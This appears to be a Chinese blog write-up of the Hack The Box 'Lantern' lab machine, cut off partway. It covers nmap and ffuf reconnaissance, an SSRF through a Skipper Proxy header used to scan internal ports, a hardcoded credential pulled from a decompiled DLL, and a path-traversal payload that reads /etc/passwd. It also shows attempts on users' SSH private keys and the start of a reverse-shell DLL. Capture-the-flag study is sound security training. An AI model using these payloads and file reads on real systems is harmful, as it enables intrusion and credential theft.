<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Enum &amp; ReconNmap Scan12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788nmap -">
<meta property="og:type" content="article">
<meta property="og:title" content="Lantern">
<meta property="og:url" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/index.html">
<meta property="og:site_name" content="一语成谶">
<meta property="og:description" content="Enum &amp; ReconNmap Scan12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788nmap -">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/Lantern.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112160430044.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112083908416.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112160559333.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112092408097.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112092533564.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112093135450.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112093307723.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112093317166.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112093423418.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112093844040.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112100318740.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112100933430.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112101049847.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112101214046.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112101345973.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112101754219.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112101853113.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112102828099.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112102902586.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112103432369.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112103649554.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112103805766.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112164228242.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112114621122.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112122728945.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112125546716.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112130043331.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112130912002.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112150022331.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112150155147.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112154014500.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112155255289.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112155618249.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112155229302.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112155706548.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112164532252.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112164843828.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112170949634.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112170701751.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112171607443.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112171724434.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112172130488.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112172302097.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112173619389.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112175731726.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112180210005.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112183156047.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112184203008.png">
<meta property="og:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/image-20241112184258652.png">
<meta property="article:published_time" content="2024-11-11T16:00:00.000Z">
<meta property="article:modified_time" content="2024-11-18T12:30:51.199Z">
<meta property="article:author" content="Fermionorz">
<meta property="article:tag" content="Skipper_Proxy">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="Procmon">
<meta property="article:tag" content="CVE-2022-38580">
<meta property="article:tag" content="CodemerxDecompile">
<meta property="article:tag" content="Blazor">
<meta property="article:tag" content="Dotnet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fermionorz.github.io/2024/11/11/HTB-Lantern/Lantern.png">
    
    
      
        
          <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/112745175">
        
      
      
        
          <link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/112745175" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/112745175">
        
      
    
    <!-- title -->
    <title>Lantern</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="一语成谶" type="application/atom+xml" />
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/about">关于</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/11/12/HTB-MonitorsThree/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/11/07/HTB-University/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/11/HTB-Lantern/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&text=Lantern"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&is_video=false&description=Lantern"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Lantern&body=Check out this article: http://fermionorz.github.io/2024/11/11/HTB-Lantern/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&name=Lantern&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&t=Lantern"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum-Recon"><span class="toc-number">1.</span> <span class="toc-text">Enum &amp; Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VHost-Scan"><span class="toc-number">1.2.</span> <span class="toc-text">VHost Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Tomas"><span class="toc-number">2.</span> <span class="toc-text">Shell as Tomas</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Enum"><span class="toc-number">2.1.</span> <span class="toc-text">Local Enum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Root"><span class="toc-number">3.</span> <span class="toc-text">Shell as Root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More"><span class="toc-number">4.</span> <span class="toc-text">More</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dump-Hash"><span class="toc-number">4.1.</span> <span class="toc-text">Dump Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bot-exp"><span class="toc-number">4.2.</span> <span class="toc-text">bot.exp</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Lantern
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Fermionorz</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-11-12</time>
        
        (Updated: <time datetime="2024-11-18T12:30:51.199Z" class="dt-updated" itemprop="dateModified">2024-11-18</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Machines/">Machines</a> › <a class="category-link" href="/categories/Machines/Linux/">Linux</a> › <a class="category-link" href="/categories/Machines/Linux/Hard/">Hard</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Blazor/" rel="tag">Blazor</a>, <a class="p-category" href="/tags/CVE-2022-38580/" rel="tag">CVE-2022-38580</a>, <a class="p-category" href="/tags/CodemerxDecompile/" rel="tag">CodemerxDecompile</a>, <a class="p-category" href="/tags/Dotnet/" rel="tag">Dotnet</a>, <a class="p-category" href="/tags/LFI/" rel="tag">LFI</a>, <a class="p-category" href="/tags/Procmon/" rel="tag">Procmon</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/Skipper-Proxy/" rel="tag">Skipper_Proxy</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <img src="/2024/11/11/HTB-Lantern/Lantern.png" class="">

<h2 id="Enum-Recon"><a href="#Enum-Recon" class="headerlink" title="Enum &amp; Recon"></a>Enum &amp; Recon</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 1000 -T4 -sC -sV -O -oA <span class="built_in">log</span>/nmap -v [ip]</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)</span><br><span class="line">|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)</span><br><span class="line">80/tcp   open  http    Skipper Proxy</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://lantern.htb/</span><br><span class="line">|_http-server-header: Skipper Proxy</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Length: 207</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:37 GMT</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 225</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span><br><span class="line">|     Location: http://lantern.htb/</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=<span class="string">&quot;http://lantern.htb/&quot;</span>&gt;http://lantern.htb/&lt;/a&gt;. If not, click the <span class="built_in">link</span>.</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Allow: HEAD, GET, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span><br><span class="line">|_    Server: Skipper Proxy</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 500 Internal Server Error</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|     System.UriFormatException: Invalid URI: The hostname could not be parsed.</span><br><span class="line">|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions&amp; creationOptions)</span><br><span class="line">|     System.Uri..ctor(String uriString, UriKind uriKind)</span><br><span class="line">|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)</span><br><span class="line">|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)</span><br><span class="line">|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)</span><br><span class="line">|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.&lt;InitializeStandardComponentServicesAsync&gt;g__InitializeCore|5_0(HttpContext httpContext)</span><br><span class="line">|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   Help: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:36 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 505 HTTP Version Not Supported</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:42 GMT</span><br><span class="line">|     Server: Kestrel</span><br><span class="line">|   SSLSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:58 GMT</span><br><span class="line">|_    Server: Kestrel</span><br></pre></td></tr></table></figure>

<h3 id="VHost-Scan"><a href="#VHost-Scan" class="headerlink" title="VHost Scan"></a>VHost Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://lantern.htb/ -H <span class="string">&quot;Host: FUZZ.lantern.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -<span class="built_in">fc</span> 302 -o logs/vhost.log</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112160430044.png" class="">
<h2 id="Shell-as-Tomas"><a href="#Shell-as-Tomas" class="headerlink" title="Shell as Tomas"></a>Shell as Tomas</h2><img src="/2024/11/11/HTB-Lantern/image-20241112083908416.png" class="">

<p>查看 80 端口，一个普通的主页，在下面发现三个名称，先作为用户名保存起来</p>
<ul>
<li>扫描目录</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --no-state -u http://lantern.htb/ -o logs/feroxbuster_lantern_htb.log</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112160559333.png" class="">

<p>没发现什么有用的目录，回看 Nmap 日志，或者查看数据包</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112092408097.png" class="">

<p>发现使用的 HTTP 服务器是 Skipper Proxy，并且找到一个 SSRF 漏洞</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112092533564.png" class="">

<img src="/2024/11/11/HTB-Lantern/image-20241112093135450.png" class="">

<p>构造请求包</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112093307723.png" class="">

<img src="/2024/11/11/HTB-Lantern/image-20241112093317166.png" class="">

<p>可以看到是存在漏洞的，那么可以利用此漏洞进行端口扫描</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112093423418.png" class="">

<p>首先对 nmap 发现的 3000 端口进行尝试，发现响应中有一部分类似 Base64 的数据</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112093844040.png" class="">

<p>看到其中有 <code>\u002B</code>，替换成 + 号再次尝试</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112100318740.png" class="">

<p>Base64 解码失败，识别发现很可能是某种加密，暂且搁置，先扫描一下看看是否有其他端口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://lantern.htb/ -H <span class="string">&quot;X-Skipper-Proxy: http://127.0.0.1:FUZZ&quot;</span> -w res/top1000.port -mc 200</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112100933430.png" class="">

<p>发现 5000、8000 端口</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112101049847.png" class="">

<p>其中 5000 端口的响应，像是一个跳转页面，使用浏览器打开</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112101214046.png" class="">

<p>还是加载错误</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112101345973.png" class="">

<p>再看 8000 端口和 80 端口内容一样，那就侧重一下 5000 端口</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112101754219.png" class="">

<p>结合搜索引擎，发现一个眼熟的服务，但是 3000 端口的字符串是 blazor，由于不太了解，只能再次搜索</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112101853113.png" class="">

<p>看来确实是有关系的，那么可以搜索一下这个 blazor 框架的相关路径</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112102828099.png" class="">

<p>从字典中找到两个路径，尝试访问一下</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112102902586.png" class="">

<p>发现了一些 DLL 及其 sha256，这里可以看一下有没有自定义的 dll 文件</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112103432369.png" class="">

<img src="/2024/11/11/HTB-Lantern/image-20241112103649554.png" class="">

<p>下载到本地，查看字符串，由于 Windows 变成会用宽字符，所以也要尝试 <code>strings -e b</code> 查看</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112103805766.png" class="">

<p>有些 base64 字符串，也有噪音，可以使用 CodemerxDecompile 看一下</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112164228242.png" class="">

<img src="/2024/11/11/HTB-Lantern/image-20241112114621122.png" class="">

<p>其中包含一个凭据 <code>admin:AJbFA_Q@925p9ap#22</code>，尝试 ssh 登录失败，转向 3000 端口</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112122728945.png" class="">

<img src="/2024/11/11/HTB-Lantern/image-20241112125546716.png" class="">

<p>这里可以看到 8000 端口的 Web 服务，其中有个很明显的拼接漏洞，如果传入的参数为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lang = ../../../</span><br><span class="line">file_ext = <span class="string">&#x27;./etc/passwd&#x27;</span></span><br></pre></td></tr></table></figure>

<p>那么最终拼接得到的字符串为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/sites/localisation/../../.././etc/passwd</span><br><span class="line">=&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112130043331.png" class="">

<p>其中分配到 Bash 的用户有 <code>root</code>、<code>tomas</code> 尝试读取他们目录下的私钥</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112130912002.png" class="">

<p>尝试了几次无法读取，猜测可能是权限不够</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112150022331.png" class="">

<p>再看这里的 Logs 功能，发现他是加载 <code>/opt/composnents/Logs.dll</code> 实现的，那么刚好这里也有一个上传接口，如果能上传一个 vuln.dll 到这里然后利用此功能点加载 dll 应该可以获得进一步的权限。</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112150155147.png" class="">

<p>这里的上传流量是 blazor 框架以 Web Assembly 方式运行，通过 Web socket 通讯，因此 BurpSuite 需要一个 Blazor Traffic Processor 插件会比较方便。</p>
<p>那么接下来创建一个 C# 项目</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet new classlib -n rev</span><br></pre></td></tr></table></figure>

<p>编辑 <code>rev/Class1.cs</code></p>
